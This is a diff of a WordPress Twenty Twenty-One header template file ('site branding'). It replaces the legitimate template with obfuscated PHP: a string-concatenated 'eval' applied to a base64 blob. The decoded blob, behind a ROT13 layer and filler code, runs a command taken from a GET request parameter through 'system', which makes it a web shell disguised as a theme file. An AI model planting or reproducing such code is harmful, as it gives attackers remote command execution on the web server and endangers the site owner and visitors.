@@ -1,52 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Displays header site branding
- *
- * @package WordPress
- * @subpackage Twenty_Twenty_One
- * @since Twenty Twenty-One 1.0
- */
-
-$blog_info    = get_bloginfo( 'name' );
-$description  = get_bloginfo( 'description', 'display' );
-$show_title   = ( true === get_theme_mod( 'display_title_and_tagline', true ) );
-$header_class = $show_title ? 'site-title' : 'screen-reader-text';
-
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogUXZmY3lubGYgdXJucXJlIGZ2Z3Igb2VuYXF2YXQKICoKICogQGNucHhudHIgSmJlcUNlcmZmCiAqIEBmaG9jbnB4bnRyIEdqcmFnbF9HanJhZ2xfQmFyCiAqIEBmdmFwciBHanJhZ2wgR2pyYWdsLUJhciAxLjAKICovCgokb3lidF92YXNiICAgID0gdHJnX295YnR2YXNiKCAnYW56cicgKTsKJHFyZnBldmNndmJhICA9IHRyZ19veWJ0dmFzYiggJ3FyZnBldmNndmJhJywgJ3F2ZmN5bmwnICk7CiRmdWJqX2d2Z3lyICAgPSAoIGdlaHIgPT09IHRyZ19ndXJ6cl96YnEoICdxdmZjeW5sX2d2Z3lyX25hcV9nbnR5dmFyJywgZ2VociApICk7CiR1cm5xcmVfcHluZmYgPSAkZnVial9ndmd5ciA/ICdmdmdyLWd2Z3lyJyA6ICdmcGVycmEtZXJucXJlLWdya2cnOwoKPz4KCjw/Y3VjIHZzICggdW5mX3BoZmdiel95YnRiKCkgJiYgJGZ1YmpfZ3ZneXIgKSA6ID8+Cgk8cXZpIHB5bmZmPVwiZnZnci15YnRiXCI+PD9jdWMgZ3VyX3BoZmdiel95YnRiKCk7ID8+PC9xdmk+Cjw/Y3VjIHJhcXZzOyA/PgoKPHF2aSBweW5mZj1cImZ2Z3Itb2VuYXF2YXRcIj4KCgk8P2N1YyB2cyAoIHVuZl9waGZnYnpfeWJ0YigpICYmICEgJGZ1YmpfZ3ZneXIgKSA6ID8+CgkJPHF2aSBweW5mZj1cImZ2Z3IteWJ0YlwiPjw/Y3VjIGd1cl9waGZnYnpfeWJ0YigpOyA/PjwvcXZpPgoJPD9jdWMgcmFxdnM7ID8+CgoJPD9jdWMgdnMgKCAkb3lidF92YXNiICkgOiA/PgoJCTw/Y3VjIHZzICggdmZfc2ViYWdfY250cigpICYmICEgdmZfY250cnEoKSApIDogPz4KCQkJPHUxIHB5bmZmPVwiPD9jdWMgcnB1YiByZnBfbmdnZSggJHVybnFyZV9weW5mZiApOyA/PlwiPjw/Y3VjIHJwdWIgcmZwX3VnenkoICRveWJ0X3Zhc2IgKTsgPz48L3UxPgoJCTw/Y3VjIHJ5ZnJ2cyAoIHZmX3NlYmFnX2NudHIoKSAmJiAhIHZmX3VienIoKSApIDogPz4KCQkJPHUxIHB5bmZmPVwiPD9jdWMgcnB1YiByZnBfbmdnZSggJHVybnFyZV9weW5mZiApOyA/PlwiPjxuIHVlcnM9XCI8P2N1YyBycHViIHJmcF9oZXkoIHVienJfaGV5KCAnLycgKSApOyA/PlwiIGVyeT1cInVienJcIj48P2N1YyBycHViIHJmcF91Z3p5KCAkb3lidF92YXNiICk7ID8+PC9uPjwvdTE+CgkJPD9jdWMgcnlmciA6ID8+CgkJCTxjIHB5bmZmPVwiPD9jdWMgcnB1YiByZnBfbmdnZSggJHVybnFyZV9weW5mZiApOyA/PlwiPjxuIHVlcnM9XCI8P2N1YyBycHViIHJmcF9oZXkoIHVienJfaGV5KCAnLycgKSApOyA/PlwiIGVyeT1cInVienJcIj48P2N1YyBycHViIHJmcF91Z3p5KCAkb3lidF92YXNiICk7ID8+PC9uPjwvYz4KCQk8P2N1YyByYXF2czsgPz4KCTw/Y3VjIHJhcXZzOyA/PgoKCTw/Y3VjIHZzICggJHFyZnBldmNndmJhICYmIGdlaHIgPT09IHRyZ19ndXJ6cl96YnEoICdxdmZjeW5sX2d2Z3lyX25hcV9nbnR5dmFyJywgZ2VociApICkgOiA/PgoJCTxjIHB5bmZmPVwiZnZnci1xcmZwZXZjZ3ZiYVwiPgoJCQk8P2N1YyBycHViICRxcmZwZXZjZ3ZiYTsgLy8gY3VjcGY6dnRhYmVyIEpiZXFDZXJmZi5GcnBoZXZnbC5SZnBuY3JCaGdjaGcgPz4KCQk8L2M+Cgk8P2N1YyByYXF2czsgPz4KPC9xdmk+PCEtLSAuZnZnci1vZW5hcXZhdCAtLT4KCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
 ?>
-
-<?php if ( has_custom_logo() && $show_title ) : ?>
-	<div class="site-logo"><?php the_custom_logo(); ?></div>
-<?php endif; ?>
-
-<div class="site-branding">
-
-	<?php if ( has_custom_logo() && ! $show_title ) : ?>
-		<div class="site-logo"><?php the_custom_logo(); ?></div>
-	<?php endif; ?>
-
-	<?php if ( $blog_info ) : ?>
-		<?php if ( is_front_page() && ! is_paged() ) : ?>
-			<h1 class="<?php echo esc_attr( $header_class ); ?>"><?php echo esc_html( $blog_info ); ?></h1>
-		<?php elseif ( is_front_page() && ! is_home() ) : ?>
-			<h1 class="<?php echo esc_attr( $header_class ); ?>"><a href="<?php echo esc_url( home_url( '/' ) ); ?>" rel="home"><?php echo esc_html( $blog_info ); ?></a></h1>
-		<?php else : ?>
-			<p class="<?php echo esc_attr( $header_class ); ?>"><a href="<?php echo esc_url( home_url( '/' ) ); ?>" rel="home"><?php echo esc_html( $blog_info ); ?></a></p>
-		<?php endif; ?>
-	<?php endif; ?>
-
-	<?php if ( $description && true === get_theme_mod( 'display_title_and_tagline', true ) ) : ?>
-		<p class="site-description">
-			<?php echo $description; // phpcs:ignore WordPress.Security.EscapeOutput ?>
-		</p>
-	<?php endif; ?>
-</div><!-- .site-branding -->
